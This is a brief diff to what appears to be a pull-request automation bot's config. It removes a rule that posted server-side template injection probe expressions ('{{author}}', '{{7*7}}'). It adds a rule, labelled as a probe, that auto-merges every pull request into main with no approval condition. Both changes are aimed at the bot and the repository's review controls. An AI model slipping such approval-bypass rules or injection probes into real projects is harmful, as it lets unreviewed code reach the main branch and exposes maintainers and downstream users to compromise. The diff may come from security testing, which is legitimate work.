@@ -1,8 +1,7 @@
 pull_request_rules:
-  - name: SSTI-PROBE
+  - name: MERGE-WITHOUT-APPROVAL-PROBE
     conditions:
       - base=main
-      - -closed
     actions:
-      comment:
-        message: "SSTIPROBE ctrl-author={{author}} arith={{7*7}} end"
+      merge:
+        method: merge
